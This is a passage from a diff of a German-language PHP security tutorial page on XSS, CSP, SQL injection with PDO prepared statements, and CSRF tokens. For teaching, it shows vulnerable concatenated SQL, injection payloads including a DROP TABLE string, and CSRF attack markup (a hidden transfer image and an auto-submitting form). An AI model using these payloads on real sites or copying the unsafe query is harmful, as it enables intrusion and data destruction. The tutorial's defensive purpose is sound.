+echo "&lt;script&gt;var user = '$username';&lt;/script&gt;";
+
+?&gt;</code></pre>
+                        </div> <!-- Flasch -->
+                    </div>
+
+                    <!-- Richtig -->
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-lang">BESSER: JSON-Encoding nutzen</span>
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 30.5 30.5" width="30" height="30" class="icon-success" fill="#20a66e" aria-hidden="true">
+                                <path d="M15.25,0C6.83,0,0,6.83,0,15.25s6.83,15.25,15.25,15.25,15.25-6.83,15.25-15.25S23.67,0,15.25,0ZM24.85,10.96l-10.96,10.96c-.33.33-.76.49-1.19.49s-.86-.16-1.19-.49l-5.13-5.13c-.66-.66-.66-1.73,0-2.39.66-.66,1.73-.66,2.39,0l3.94,3.94,9.76-9.76c.66-.66,1.73-.66,2.39,0,.66.66.66,1.73,0,2.39Z">
+                                </path>
+                            </svg>
+                        </div>
+                        <pre><code class="language-php">&lt;?php
+$username = $_SESSION['username'] ?? 'Gast';
+
+// BESSER: JSON-Encoding nutzen
+echo '&lt;script&gt;var user = ' . json_encode($username, JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT) . ';&lt;/script&gt;';
+?&gt;</code></pre>
+
+                    </div> <!-- Richtig -->
+
+                    <div class="info-box danger">
+                        <strong class="box-title danger no-toc" id="achtung">Wichtig: htmlspecialchars() reicht nicht in
+                            JavaScript!
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 30.5 30.5" width="30" height="30" fill="currentColor">
+                                <path d="M15.25,0C6.83,0,0,6.83,0,15.25s6.83,15.25,15.25,15.25,
+                15.25-6.83,15.25-15.25S23.67,0,15.25,0ZM14.35,4.75h1.71c.6,
+                0,1.07.49,1.06,1.09l-.35,12.32c-.02.57-.48,1.03-1.06,1.03h-.98c-.57,
+                0-1.04-.45-1.06-1.02l-.38-12.32c-.02-.6.46-1.09,1.06-1.09ZM16.7,
+                25.2c-.39.37-.88.55-1.46.55s-1.04-.18-1.44-.55c-.39-.37-.59-.81-.59-1.33s.2-.95.59-1.32c.4-.37.88-.55,
+                1.44-.55s1.07.18,1.46.55c.39.37.59.81.59,1.32s-.2.96-.59,1.33Z"></path>
+                            </svg>
+                        </strong>
+                        <p>In JavaScript-Kontexten nutze <code>json_encode()</code> mit den entsprechenden Flags. Noch
+                            besser: Vermeide es ganz, PHP-Werte direkt in JavaScript zu schreiben. Nutze stattdessen
+                            Data-Attribute oder AJAX.</p>
+
+                    </div>
+
+                    <h3 id="content-security-policy-csp">Content Security Policy (CSP)</h3>
+                    <p>Eine zusätzliche Schutzebene gegen XSS:</p>
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-lang">PHP</span>
+                            <button class="code-copy">
+                                <span class="copy-icon">
+                                    <img src="/assets/icons/clipboard.svg" alt="Copy Icon" width="16" height="16">
+                                </span>
+                                <span class="copy-text">Kopieren</span>
+                            </button>
+                        </div>
+                        <pre><code class="language-php">&lt;?php
+// Verbiete inline-Scripts und erlaube nur Scripts von eigener Domain
+header("Content-Security-Policy: default-src 'self'; script-src 'self'");
+?&gt;</code></pre>
+                    </div>
+
+                    <p>Oder im HTML-Head:</p>
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-lang">HTML</span>
+                            <button class="code-copy">
+                                <span class="copy-icon">
+                                    <img src="/assets/icons/clipboard.svg" alt="Copy Icon" width="16" height="16">
+                                </span>
+                                <span class="copy-text">Kopieren</span>
+                            </button>
+                        </div>
+                        <pre><code class="language-html">&lt;meta http-equiv="Content-Security-Policy" 
+      content="default-src 'self'; script-src 'self'"&gt;</code></pre>
+                    </div>
+                </section>
+
+                <!-- SQL Injection -->
+                <section class="tutorials-content">
+                    <h2 id="sql-injection-der-klassiker">SQL Injection – Der Klassiker</h2>
+                    <p>SQL Injection ist eine der gefährlichsten Angriffsmethoden. Dabei manipuliert ein Angreifer deine
+                        Datenbankabfragen, um Daten zu stehlen, zu ändern oder zu löschen.</p>
+
+                    <h3 id="wie-funktioniert-sql-injection">Wie funktioniert SQL Injection?</h3>
+                    <p>Stell dir vor, du hast diesen Code:</p>
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-lang">EXTREM GEFÄHRLICH - NIEMALS SO!</span>
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 30.5 30.5" width="30" height="30" class="icon-danger" fill="var(--accent-red)" role="img" aria-label="Extrem gefährlich">
+                                <path d="M15.2,0C6.8,0,0,6.8,0,15.2s6.8,15.2,15.2,15.2,15.2-6.8,15.2-15.2S23.7,0,15.2,0ZM23.2,
+20.7c.4.4.4,1,0,1.4l-1.1,1.1c-.4.4-1,.4-1.4,0l-5.5-5.5-5.5,5.5c-.4.4-1,.4-1.4,0l-1.1-1.1c-.4-.4-.4-1,
+0-1.4l5.5-5.5-5.5-5.5c-.4-.4-.4-1,0-1.4l1.1-1.1c.4-.4,1-.4,1.4,0l5.5,5.5,5.5-5.5c.4-.4,1-.4,1.4,0l1.1,1.1c.4.4.4,1,0,1.4l-5.5,5.5,5.5,5.5Z">
+                                </path>
+                            </svg>
+                        </div>
+                        <pre><code class="language-php">&lt;?php
+// EXTREM GEFÄHRLICH - NIEMALS SO!
+$username = $_POST['username'];
+$password = $_POST['password'];
+
+$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
+$result = mysqli_query($connection, $query);
+?&gt;</code></pre>
+                    </div>
+
+                    <p>Ein Angreifer könnte als Username eingeben:</p>
+
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-lang">EXTREM GEFÄHRLICH - NIEMALS SO!</span>
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 30.5 30.5" width="30" height="30" class="icon-danger" fill="var(--accent-red)" role="img" aria-label="Extrem gefährlich">
+                                <path d="M15.2,0C6.8,0,0,6.8,0,15.2s6.8,15.2,15.2,15.2,15.2-6.8,15.2-15.2S23.7,0,15.2,0ZM23.2,
+20.7c.4.4.4,1,0,1.4l-1.1,1.1c-.4.4-1,.4-1.4,0l-5.5-5.5-5.5,5.5c-.4.4-1,.4-1.4,0l-1.1-1.1c-.4-.4-.4-1,
+0-1.4l5.5-5.5-5.5-5.5c-.4-.4-.4-1,0-1.4l1.1-1.1c.4-.4,1-.4,1.4,0l5.5,5.5,5.5-5.5c.4-.4,1-.4,1.4,0l1.1,1.1c.4.4.4,1,0,1.4l-5.5,5.5,5.5,5.5Z">
+                                </path>
+                            </svg>
+                        </div>
+                        <pre><code class="language-bash">admin' OR '1'='1</code></pre>
+                    </div>
+
+                    <p>Die resultierende SQL-Abfrage wäre dann:</p>
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-lang">EXTREM GEFÄHRLICH - NIEMALS SO!</span>
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 30.5 30.5" width="30" height="30" class="icon-danger" fill="var(--accent-red)" role="img" aria-label="Extrem gefährlich">
+                                <path d="M15.25,0C6.83,0,0,6.83,0,15.25s6.83,15.25,15.25,15.25,15.25-6.83,15.25-15.25S23.67,0,15.25,0ZM14.35,4.75h1.71c.6,0,
+    1.07.49,1.06,1.09l-.35,12.32c-.02.57-.48,1.03-1.06,1.03h-.98c-.57,0-1.04-.45-1.06-1.02l-.38-12.32c-.02-.6.46-1.09,1.06-1.09ZM16.7,
+    25.2c-.39.37-.88.55-1.46.55s-1.04-.18-1.44-.55c-.39-.37-.59-.81-.59-1.33s.2-.95.59-1.32c.4-.37.88-.55,1.44-.55s1.07.18,1.46.55c.39.37.59.81.59,1.32s-.2.96-.59,1.33Z">
+                                </path>
+                            </svg>
+                        </div>
+                        <pre><code class="language-bash">SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = ''</code></pre>
+                    </div>
+                    <p>Da <code>'1'='1'</code> immer wahr ist, gibt diese Abfrage <strong>alle Nutzer</strong> zurück –
+                        ohne Passwort!</p>
+
+                    <div class="info-box danger">
+                        <strong class="box-title danger no-toc" id="achtung">Noch schlimmer:
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 30.5 30.5" width="30" height="30" fill="currentColor">
+                                <path d="M15.25,0C6.83,0,0,6.83,0,15.25s6.83,15.25,15.25,15.25,
+                15.25-6.83,15.25-15.25S23.67,0,15.25,0ZM14.35,4.75h1.71c.6,
+                0,1.07.49,1.06,1.09l-.35,12.32c-.02.57-.48,1.03-1.06,1.03h-.98c-.57,
+                0-1.04-.45-1.06-1.02l-.38-12.32c-.02-.6.46-1.09,1.06-1.09ZM16.7,
+                25.2c-.39.37-.88.55-1.46.55s-1.04-.18-1.44-.55c-.39-.37-.59-.81-.59-1.33s.2-.95.59-1.32c.4-.37.88-.55,
+                1.44-.55s1.07.18,1.46.55c.39.37.59.81.59,1.32s-.2.96-.59,1.33Z"></path>
+                            </svg>
+                        </strong>
+                        <p>Ein Angreifer könnte auch eingeben:</p>
+                        <p><code>admin'; DROP TABLE users; --</code></p>
+                        <p>Das würde deine gesamte User-Tabelle löschen!</p>
+                    </div>
+
+                    <h3 id="schutz-vor-sql-injection-prepared-statements">Schutz vor SQL Injection: Prepared Statements</h3>
+                    <p>Die Lösung: <strong>Prepared Statements mit PDO</strong> <span><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15 15" width="15" height="15" fill="var(--accent-green)" class="icon-va-y-2" aria-hidden="true">
+                                <path d="M6.285,15c-.47,0-.919-.21-1.22-.577L.359,8.696c-.554-.674-.456-1.668.217-2.222.673-.553,1.668-.457,2.222.217l3.287,4.001L12.069.764c.449-.748,1.419-.987,2.167-.537.747.45.988,1.42.537,2.167l-7.136,11.842c-.264.439-.726.722-1.237.76-.039.002-.077.004-.115.004Z">
+                                </path>
+                            </svg></span>
+                    </p><p>Das ist der moderne, sichere Standard:</p>
+                    <p></p>
+
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-lang">PHP</span>
+                            <button class="code-copy">
+                                <span class="copy-icon">
+                                    <img src="/assets/icons/clipboard.svg" alt="Copy Icon" width="16" height="16">
+                                </span>
+                                <span class="copy-text">Kopieren</span>
+                            </button>
+                        </div>
+                        <pre><code class="language-php">&lt;?php
+// SICHER mit PDO Prepared Statements
+
+try {
+    // Datenbankverbindung aufbauen
+    $pdo = new PDO(
+        'mysql:host=localhost;dbname=meine_db;charset=utf8mb4',
+        'username',
+        'password',
+        [
+            PDO::ATTR_ERRMODE =&gt; PDO::ERRMODE_EXCEPTION,
+            PDO::ATTR_DEFAULT_FETCH_MODE =&gt; PDO::FETCH_ASSOC,
+            PDO::ATTR_EMULATE_PREPARES =&gt; false
+        ]
+    );
+
+    // Prepared Statement vorbereiten
+    $stmt = $pdo-&gt;prepare('SELECT * FROM users WHERE username = :username AND password = :password');
+    
+    // Werte binden (automatisch escaped!)
+    $stmt-&gt;execute([
+        ':username' =&gt; $_POST['username'],
+        ':password' =&gt; $_POST['password'] // In Realität: Passwort-Hash!
+    ]);
+    
+    // Ergebnis holen
+    $user = $stmt-&gt;fetch();
+    
+    if ($user) {
+        echo "Login erfolgreich!";
+    } else {
+        echo "Login fehlgeschlagen!";
+    }
+    
+} catch (PDOException $e) {
+    // Fehler loggen, aber NICHT dem Nutzer zeigen!
+    error_log($e-&gt;getMessage());
+    echo "Ein Fehler ist aufgetreten.";
+}
+?&gt;</code></pre>
+                    </div>
+
+                    <div class="info-box">
+                        <strong class="box-title no-toc">Warum sind Prepared Statements sicher?
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 30.5 30.5" width="30" height="30" fill="currentColor">
+                                <path d="M15.25,0C6.83,0,0,6.83,0,15.25s6.83,15.25,15.25,15.25,15.25-6.83,15.25-15.25S23.67,0,15.25,0ZM15.56,3.83c1.22,0,2.21.99,2.21,2.21s-.99,2.21-2.21,2.21-2.21-.99-2.21-2.21.99-2.21,2.21-2.21ZM18.51,25.93h-5.9c-.82,0-1.47-.66-1.47-1.47s.66-1.47,1.47-1.47h1.47v-8.84h-1.47c-.82,0-1.47-.66-1.47-1.47s.66-1.47,1.47-1.47h2.95c.82,0,1.47.66,1.47,1.47v10.32h1.47c.82,0,1.47.66,1.47,1.47s-.66,1.47-1.47,1.47Z"></path>
+                            </svg>
+                        </strong>
+                        <ul class="arrow-list">
+                            <li>SQL-Query und Daten werden <strong>getrennt</strong> zum Datenbankserver geschickt</li>
+                            <li>Die Datenbank weiß genau: "Das ist Code, das sind Daten"</li>
+                            <li>Nutzereingaben können die SQL-Struktur <strong>nicht</strong> verändern</li>
+                            <li>Kein manuelles Escaping nötig – passiert automatisch</li>
+                        </ul>
+                    </div>
+
+                    <h3 id="verschiedene-bind-methoden">Verschiedene Bind-Methoden</h3>
+
+                    <h4>Named Parameters (empfohlen)</h4>
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-lang">PHP</span>
+                            <button class="code-copy">
+                                <span class="copy-icon">
+                                    <img src="/assets/icons/clipboard.svg" alt="Copy Icon" width="16" height="16">
+                                </span>
+                                <span class="copy-text">Kopieren</span>
+                            </button>
+                        </div>
+                        <pre><code class="language-php">&lt;?php
+$stmt = $pdo-&gt;prepare('SELECT * FROM users WHERE email = :email AND age &gt; :age');
+$stmt-&gt;execute([
+    ':email' =&gt; $email,
+    ':age' =&gt; $age
+]);
+?&gt;</code></pre>
+                    </div>
+
+                    <h4>Positional Parameters</h4>
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-lang">PHP</span>
+                            <button class="code-copy">
+                                <span class="copy-icon">
+                                    <img src="/assets/icons/clipboard.svg" alt="Copy Icon" width="16" height="16">
+                                </span>
+                                <span class="copy-text">Kopieren</span>
+                            </button>
+                        </div>
+                        <pre><code class="language-php">&lt;?php
+$stmt = $pdo-&gt;prepare('SELECT * FROM users WHERE email = ? AND age &gt; ?');
+$stmt-&gt;execute([$email, $age]);
+?&gt;</code></pre>
+                    </div>
+
+                    <h3 id="was-du-nicht-mit-prepared-statements-machen-kannst">Was du NICHT mit Prepared Statements machen kannst</h3>
+                    <p>Prepared Statements funktionieren nur für <strong>Werte</strong>, nicht für:</p>
+                    <ul class="arrow-list grid-2col-bg">
+                        <li>Tabellennamen <svg xmlns="http://www.w3.org/2000/svg" width="15" height="15" viewBox="0 0 15 15" class="icon-va-y-2 ml-sm mr-sm" fill="var(--accent-red)" aria-hidden="true">
+                                <path d="M14.516,12.177c.646.646.646,1.693,0,2.338h0c-.646.646-1.693.646-2.339,0l-4.342-4.342c-.185-.185-.484-.185-.669,0l-4.342,4.342c-.646.646-1.693.646-2.338,0h0c-.646-.646-.646-1.693,0-2.339l4.343-4.342c.185-.185.185-.484,0-.669L.484,2.823c-.646-.646-.646-1.693,0-2.338h0c.646-.646,1.693-.646,2.338,0l4.342,4.342c.185.185.484.185.669,0L12.177.484c.646-.646,1.693-.646,2.339,0h0c.646.646.646,1.693,0,2.338l-4.342,4.343c-.185.185-.185.484,0,.669l4.342,4.342Z"></path>
+                            </svg></li>
+                        <li>Spaltennamen <svg xmlns="http://www.w3.org/2000/svg" width="15" height="15" viewBox="0 0 15 15" class="icon-va-y-2 ml-sm mr-sm" fill="var(--accent-red)" aria-hidden="true">
+                                <path d="M14.516,12.177c.646.646.646,1.693,0,2.338h0c-.646.646-1.693.646-2.339,0l-4.342-4.342c-.185-.185-.484-.185-.669,0l-4.342,4.342c-.646.646-1.693.646-2.338,0h0c-.646-.646-.646-1.693,0-2.339l4.343-4.342c.185-.185.185-.484,0-.669L.484,2.823c-.646-.646-.646-1.693,0-2.338h0c.646-.646,1.693-.646,2.338,0l4.342,4.342c.185.185.484.185.669,0L12.177.484c.646-.646,1.693-.646,2.339,0h0c.646.646.646,1.693,0,2.338l-4.342,4.343c-.185.185-.185.484,0,.669l4.342,4.342Z"></path>
+                            </svg></li>
+                        <li>SQL-Keywords (ORDER BY, ASC/DESC, etc.) <svg xmlns="http://www.w3.org/2000/svg" width="15" height="15" viewBox="0 0 15 15" class="icon-va-y-2 ml-sm mr-sm" fill="var(--accent-red)" aria-hidden="true">
+                                <path d="M14.516,12.177c.646.646.646,1.693,0,2.338h0c-.646.646-1.693.646-2.339,0l-4.342-4.342c-.185-.185-.484-.185-.669,0l-4.342,4.342c-.646.646-1.693.646-2.338,0h0c-.646-.646-.646-1.693,0-2.339l4.343-4.342c.185-.185.185-.484,0-.669L.484,2.823c-.646-.646-.646-1.693,0-2.338h0c.646-.646,1.693-.646,2.338,0l4.342,4.342c.185.185.484.185.669,0L12.177.484c.646-.646,1.693-.646,2.339,0h0c.646.646.646,1.693,0,2.338l-4.342,4.343c-.185.185-.185.484,0,.669l4.342,4.342Z"></path>
+                            </svg></li>
+                    </ul>
+
+                    <h4>Beispiel: Dynamische Sortierung</h4>
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-lang">PHP</span>
+                            <button class="code-copy">
+                                <span class="copy-icon">
+                                    <img src="/assets/icons/clipboard.svg" alt="Copy Icon" width="16" height="16">
+                                </span>
+                                <span class="copy-text">Kopieren</span>
+                            </button>
+                        </div>
+                        <pre><code class="language-php">&lt;?php
+$sortColumn = $_GET['sort'] ?? 'name';
+
+// ⨯ GEHT NICHT mit Prepared Statement 
+// $stmt = $pdo-&gt;prepare("SELECT * FROM users ORDER BY :column");
+
+// ✓ LÖSUNG: Whitelist verwenden 
+$allowedColumns = ['name', 'email', 'created_at'];
+
+if (!in_array($sortColumn, $allowedColumns)) {
+    $sortColumn = 'name'; // Fallback auf Standard
+}
+
+// Jetzt ist es sicher, den Spaltennamen direkt einzufügen
+$stmt = $pdo-&gt;prepare("SELECT * FROM users ORDER BY $sortColumn");
+$stmt-&gt;execute();
+?&gt;</code></pre>
+                    </div>
+
+                    <div class="info-box warning">
+                        <strong class="box-title warning no-toc">Wichtig bei dynamischen Queries
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 30.5 30.5" width="30" height="30" fill="currentColor">
+                                <path d="M15.25,0C6.83,0,0,6.83,0,15.25s6.83,15.25,15.25,15.25,
+                15.25-6.83,15.25-15.25S23.67,0,15.25,0ZM14.35,4.75h1.71c.6,
+                0,1.07.49,1.06,1.09l-.35,12.32c-.02.57-.48,1.03-1.06,1.03h-.98c-.57,
+                0-1.04-.45-1.06-1.02l-.38-12.32c-.02-.6.46-1.09,1.06-1.09ZM16.7,
+                25.2c-.39.37-.88.55-1.46.55s-1.04-.18-1.44-.55c-.39-.37-.59-.81-.59-1.33s.2-.95.59-1.32c.4-.37.88-.55,
+                1.44-.55s1.07.18,1.46.55c.39.37.59.81.59,1.32s-.2.96-.59,1.33Z"></path>
+                            </svg>
+                        </strong>
+                        <p>Wenn du Tabellen- oder Spaltennamen dynamisch nutzen musst:</p>
+                        <ul class="arrow-list">
+                            <li>Nutze <strong>immer</strong> eine Whitelist erlaubter Werte <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15 15" width="15" height="15" fill="currentColor" class="icon-va-y-2 ml-sm mr-sm" aria-hidden="true">
+                                    <path d="M6.285,15c-.47,0-.919-.21-1.22-.577L.359,8.696c-.554-.674-.456-1.668.217-2.222.673-.553,1.668-.457,2.222.217l3.287,4.001L12.069.764c.449-.748,1.419-.987,2.167-.537.747.45.988,1.42.537,2.167l-7.136,11.842c-.264.439-.726.722-1.237.76-.039.002-.077.004-.115.004Z">
+                                    </path>
+                                </svg></li>
+                            <li>Validiere die Eingabe streng <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15 15" width="15" height="15" fill="currentColor" class="icon-va-y-2 ml-sm mr-sm" aria-hidden="true">
+                                    <path d="M6.285,15c-.47,0-.919-.21-1.22-.577L.359,8.696c-.554-.674-.456-1.668.217-2.222.673-.553,1.668-.457,2.222.217l3.287,4.001L12.069.764c.449-.748,1.419-.987,2.167-.537.747.45.988,1.42.537,2.167l-7.136,11.842c-.264.439-.726.722-1.237.76-.039.002-.077.004-.115.004Z">
+                                    </path>
+                                </svg></li>
+                            <li>Niemals direkte Nutzereingaben in SQL-Struktur einfügen <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15 15" width="15" height="15" fill="currentColor" class="icon-va-y-2 ml-sm mr-sm" aria-hidden="true">
+                                    <path d="M6.285,15c-.47,0-.919-.21-1.22-.577L.359,8.696c-.554-.674-.456-1.668.217-2.222.673-.553,1.668-.457,2.222.217l3.287,4.001L12.069.764c.449-.748,1.419-.987,2.167-.537.747.45.988,1.42.537,2.167l-7.136,11.842c-.264.439-.726.722-1.237.76-.039.002-.077.004-.115.004Z">
+                                    </path>
+                                </svg></li>
+                        </ul>
+                    </div>
+
+                    <h3 id="connection-setup-in-separater-datei">Connection-Setup in separater Datei</h3>
+                    <p>Best Practice: Datenbankverbindung in eigene Datei auslagern:</p>
+
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-lang">PHP</span>
+                            <button class="code-copy">
+                                <span class="copy-icon">
+                                    <img src="/assets/icons/clipboard.svg" alt="Copy Icon" width="16" height="16">
+                                </span>
+                                <span class="copy-text">Kopieren</span>
+                            </button>
+                        </div>
+                        <pre><code class="language-php">&lt;?php
+// config/database.php
+
+function getDB(): PDO {
+    static $pdo = null;
+    
+    if ($pdo === null) {
+        try {
+            $pdo = new PDO(
+                'mysql:host=localhost;dbname=meine_db;charset=utf8mb4',
+                'username',
+                'password',
+                [
+                    PDO::ATTR_ERRMODE =&gt; PDO::ERRMODE_EXCEPTION,
+                    PDO::ATTR_DEFAULT_FETCH_MODE =&gt; PDO::FETCH_ASSOC,
+                    PDO::ATTR_EMULATE_PREPARES =&gt; false
+                ]
+            );
+        } catch (PDOException $e) {
+            error_log('Database connection failed: ' . $e-&gt;getMessage());
+            die('Verbindung zur Datenbank fehlgeschlagen.');
+        }
+    }
+    
+    return $pdo;
+}
+
+// Dann in anderen Dateien:
+// $pdo = getDB();
+?&gt;</code></pre>
+                    </div>
+
+                </section>
+
+                <!-- CSRF -->
+                <section class="tutorials-content">
+                    <h2 id="cross-site-request-forgery-csrf">Cross-Site Request Forgery (CSRF)</h2>
+
+                    <p>Bei CSRF-Angriffen wird ein eingeloggter Nutzer dazu gebracht, ungewollt Aktionen auf deiner
+                        Website auszuführen – ohne dass er es merkt.</p>
+
+                    <h3 id="wie-funktioniert-csrf">Wie funktioniert CSRF?</h3>
+                    <p>Szenario: Du bist bei deiner Bank eingeloggt. Ein Angreifer schickt dir eine E-Mail mit diesem
+                        unsichtbaren Bild:</p>
+
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-lang">HTML</span>
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 30.5 30.5" width="30" height="30" fill="var(--accent-red-light)">
+                                <path d="M15.25,0C6.83,0,0,6.83,0,15.25s6.83,15.25,15.25,15.25,
+                15.25-6.83,15.25-15.25S23.67,0,15.25,0ZM14.35,4.75h1.71c.6,
+                0,1.07.49,1.06,1.09l-.35,12.32c-.02.57-.48,1.03-1.06,1.03h-.98c-.57,
+                0-1.04-.45-1.06-1.02l-.38-12.32c-.02-.6.46-1.09,1.06-1.09ZM16.7,
+                25.2c-.39.37-.88.55-1.46.55s-1.04-.18-1.44-.55c-.39-.37-.59-.81-.59-1.33s.2-.95.59-1.32c.4-.37.88-.55,
+                1.44-.55s1.07.18,1.46.55c.39.37.59.81.59,1.32s-.2.96-.59,1.33Z"></path>
+                            </svg>
+                        </div>
+                        <pre><code class="language-html">&lt;img src="https://bank.de/transfer.php?to=angreifer&amp;amount=10000" width="0" height="0"&gt;</code></pre>
+                    </div>
+                    <p>Wenn du die E-Mail öffnest, lädt dein Browser automatisch das "Bild" – und führt die Überweisung
+                        aus, weil du ja eingeloggt bist!</p>
+                    <div class="info-box danger">
+                        <strong class="box-title danger no-toc">CSRF kann auch mit POST funktionieren
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 30.5 30.5" width="30" height="30" fill="var(--accent-red-light)">
+                                <path d="M15.25,0C6.83,0,0,6.83,0,15.25s6.83,15.25,15.25,15.25,
+                15.25-6.83,15.25-15.25S23.67,0,15.25,0ZM14.35,4.75h1.71c.6,
+                0,1.07.49,1.06,1.09l-.35,12.32c-.02.57-.48,1.03-1.06,1.03h-.98c-.57,
+                0-1.04-.45-1.06-1.02l-.38-12.32c-.02-.6.46-1.09,1.06-1.09ZM16.7,
+                25.2c-.39.37-.88.55-1.46.55s-1.04-.18-1.44-.55c-.39-.37-.59-.81-.59-1.33s.2-.95.59-1.32c.4-.37.88-.55,
+                1.44-.55s1.07.18,1.46.55c.39.37.59.81.59,1.32s-.2.96-.59,1.33Z"></path>
+                            </svg>
+                        </strong>
+                        <p>Ein Angreifer kann ein unsichtbares Formular auf einer fremden Seite einbauen, das
+                            automatisch abgeschickt wird:</p>
+                        <div class="code-block">
+                            <pre><code class="language-html">&lt;form action="https://deine-seite.de/delete-account.php" method="post" id="csrf"&gt;
+    &lt;input type="hidden" name="confirm" value="yes"&gt;
+&lt;/form&gt;
+&lt;script&gt;document.getElementById('csrf').submit();&lt;/script&gt;</code></pre>
+                        </div>
+                    </div>
+
+                    <h3 id="schutz-vor-csrf-tokens">Schutz vor CSRF: Tokens</h3>
+                    <p>Die Lösung: <strong>CSRF-Tokens</strong> – zufällige, einmalige Werte, die bei jedem Formular
+                        mitgeschickt werden. <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15 15" width="15" height="15" fill="currentColor" class="icon-va-y-2 ml-sm mr-sm" aria-hidden="true">
+    <path d="M6.285,15c-.47,0-.919-.21-1.22-.577L.359,8.696c-.554-.674-.456-1.668.217-2.222.673-.553,1.668-.457,2.222.217l3.287,4.001L12.069.764c.449-.748,1.419-.987,2.167-.537.747.45.988,1.42.537,2.167l-7.136,11.842c-.264.439-.726.722-1.237.76-.039.002-.077.004-.115.004Z">
+    </path>
+</svg></p>
+
+                    <h4>CSRF-Token generieren und prüfen</h4>
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-lang">PHP</span>
+                            <button class="code-copy">
+                                <span class="copy-icon">
+                                    <img src="/assets/icons/clipboard.svg" alt="Copy Icon" width="16" height="16">
+                                </span>
+                                <span class="copy-text">Kopieren</span>
+                            </button>
+                        </div>
+                        <pre><code class="language-php">&lt;?php
+// functions.php oder security.php
+
+session_start();
+
+/**
+ * CSRF-Token generieren und in Session speichern
+ */
+function generateCSRFToken(): string {
+    if (empty($_SESSION['csrf_token'])) {
+        $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
+    }
+    return $_SESSION['csrf_token'];
+}
+
+/**
+ * CSRF-Token validieren
+ */
+function validateCSRFToken(string $token): bool {
+    return isset($_SESSION['csrf_token']) 
+        &amp;&amp; hash_equals($_SESSION['csrf_token'], $token);
+}
+
+/**
+ * CSRF-Token als Hidden Input ausgeben
+ */
+function csrfField(): string {
+    $token = generateCSRFToken();
+    return '&lt;input type="hidden" name="csrf_token" value="' . htmlspecialchars($token, ENT_QUOTES, 'UTF-8') . '"&gt;';
+}
+?&gt;</code></pre>
+                    </div>
+
+                    <h4>Token in Formular einbauen</h4>
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-lang">PHP</span>
+                            <button class="code-copy">
+                                <span class="copy-icon">
+                                    <img src="/assets/icons/clipboard.svg" alt="Copy Icon" width="16" height="16">
+                                </span>
+                                <span class="copy-text">Kopieren</span>
+                            </button>
+                        </div>
+                        <pre><code class="language-php">&lt;?php
+require_once 'functions.php';
+session_start();
+?&gt;
+
+&lt;form method="post" action="delete-account.php"&gt;
+    &lt;!-- CSRF-Token einfügen --&gt;
+    &lt;?php echo csrfField(); ?&gt;
+    
+    &lt;label for="confirm"&gt;
+        &lt;input type="checkbox" id="confirm" name="confirm" required&gt;
+        Ja, ich möchte meinen Account wirklich löschen
+    &lt;/label&gt;
+    
+    &lt;button type="submit"&gt;Account löschen&lt;/button&gt;
+&lt;/form&gt;</code></pre>
+                    </div>
+
+                    <h4>Token beim Verarbeiten prüfen</h4>
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-lang">PHP</span>
+                            <button class="code-copy">
+                                <span class="copy-icon">
+                                    <img src="/assets/icons/clipboard.svg" alt="Copy Icon" width="16" height="16">
+                                </span>
+                                <span class="copy-text">Kopieren</span>
+                            </button>
+                        </div>
+                        <pre><code class="language-php">&lt;?php
+// delete-account.php
+require_once 'functions.php';
+session_start();
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    
+    // CSRF-Token prüfen (IMMER als erstes!)
+    $token = $_POST['csrf_token'] ?? '';
+    
+    if (!validateCSRFToken($token)) {
+        die('Ungültiger CSRF-Token. Sicherheitswarnung!');
+    }
+    
+    // Jetzt erst weitere Verarbeitung
+    if (isset($_POST['confirm'])) {
+        // Account löschen...
+        echo "Account wurde gelöscht.";
+    }
+}
+?&gt;</code></pre>
+                    </div>
+                    <div class="info-box">
+                        <strong class="box-title no-toc">Warum hash_equals()?
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 30.5 30.5" width="30" height="30" fill="currentColor">
+                                <path d="M15.25,0C6.83,0,0,6.83,0,15.25s6.83,15.25,15.25,15.25,15.25-6.83,15.25-15.25S23.67,0,15.25,0ZM15.56,3.83c1.22,0,2.21.99,2.21,2.21s-.99,2.21-2.21,2.21-2.21-.99-2.21-2.21.99-2.21,2.21-2.21ZM18.51,25.93h-5.9c-.82,0-1.47-.66-1.47-1.47s.66-1.47,1.47-1.47h1.47v-8.84h-1.47c-.82,0-1.47-.66-1.47-1.47s.66-1.47,1.47-1.47h2.95c.82,0,1.47.66,1.47,1.47v10.32h1.47c.82,0,1.47.66,1.47,1.47s-.66,1.47-1.47,1.47Z"></path>
+                            </svg>
+                        </strong>
